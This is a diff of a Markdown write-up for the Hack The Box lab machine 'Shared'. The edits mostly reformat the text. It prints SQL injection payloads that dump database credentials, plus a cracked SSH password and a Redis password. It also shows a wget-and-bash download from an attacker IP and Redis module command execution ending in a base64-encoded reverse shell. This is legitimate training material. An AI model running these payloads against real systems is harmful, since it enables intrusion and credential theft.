@@ -1,6 +1,6 @@
 Hack the box:Shared
 
-***enumeration***
+***Enumeration***
 
 Nmap scan
 ```
@@ -16,42 +16,40 @@ Domain && subdomain
 
 vuln in cookie
 
-cookie => custom_cart=%7B%2253GG2EF8%22%3A%223%22%7D
+cookie **"custom_cart=%7B%2253GG2EF8%22%3A%223%22%7D"**
 
-decode cookie value => custom_cart={"53GG2EF8":"3"}
+decode cookie value **"custom_cart={"53GG2EF8":"3"}"**
 
 ***FootHold***
 
 union based blind sql injection
 
-referal https://infosecwriteups.com/healing-blind-injections-df30b9e0e06f
+referal **https://infosecwriteups.com/healing-blind-injections-df30b9e0e06f**
 
 
 payload
 ```
 {"53GG2EF8'AND 1=2 UNION SELECT 1,(user()),3-- -":"3"}
 ```
-database user
-
-checkout@localhost
+database username **checkout@localhost**
 
 Database Name Enumeration
 ```
 {"53GG2EF8'AND 1=2 UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -":"3"}
 ```
-information_schema,checkout
+**information_schema,checkout**
 
 Tables from checkout;
 ```
 {"53GG2EF8'AND 1=2 UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'checkout'),3-- -":"3"}
 ```
-user,product
+**user,product**
 
 Columns from user;
 ```
 {"53GG2EF8'AND 1=2 UNION SELECT 1,(select group_concat(TABLE_NAME,COLUMN_NAME) from INFORMATION_SCHEMA.COlUMNS where TABLE_SCHEMA = 'checkout'),3-- -":"3"}
 ```
-user.id,user.username,user.password,product.id,product.code,prodcut.price
+**user.id,user.username,user.password,product.id,product.code,prodcut.price**
 
 username and password from user
 ```
@@ -60,25 +58,27 @@ username and password from user
 ```
 {"53GG2EF8'AND 1=2 UNION SELECT 1,(select group_concat(password) from checkout.user),3-- -":"3"}
 ```
-james_mason:fc895d4eddc2fc12f995e18c865cf273
+**james_mason:fc895d4eddc2fc12f995e18c865cf273**
 
-cracked the hash using hashcat
+crack the hash using hashcat
 
 ssh cred => james_mason:Soleil101
 
-connect to SSH
+connect to SSH as james_mason
 
-***switch user james_mason to dan_smith***
+***Low privilege user james_mason to dan_smith***
 
 their is a cronjob running to use ipython 
 
-recent cve of ipython https://github.com/advisories/GHSA-pq7m-3gw7-gq5x
+recent cve of ipython **https://github.com/advisories/GHSA-pq7m-3gw7-gq5x**
 
 for exploiting the ipython we create a shell script to automate some purpose
 
+```
 wget http://10.10.16.19/script.sh && chmod +x script.sh && bash script.sh
+```
 
-***root***
+***Privilege escalation***
 
 The server has running redis as root but we cannot connect the server without creds so we need to
 find the cred to access the server
@@ -102,13 +102,13 @@ nc -lv localhost 9379
 ```
 after runing the binary we get the connection on netcat and got the creds
 
-redis => auth:F2WHqJUz2WEz=Gqq
+redis => **"auth:F2WHqJUz2WEz=Gqq"**
 
-after gain access the redis using the auth creds we create a custom module for runing the os commands
+after gain access the redis server using the auth creds we create a custom module for runing the os commands
 referal https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
 
-**commands**
-
+**Exploit**
+```
 auth F2WHqJUz2WEz=Gqq
 
 MODULE  LOAD /dev/shm/redis/module.so
@@ -118,3 +118,4 @@ module list
 system.exec "cat /root/root"
 
 system.exec "echo -n 'YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE2LjEwLzkwMDEgICAwPiYxIA==' | base64 -d |bash"
+```
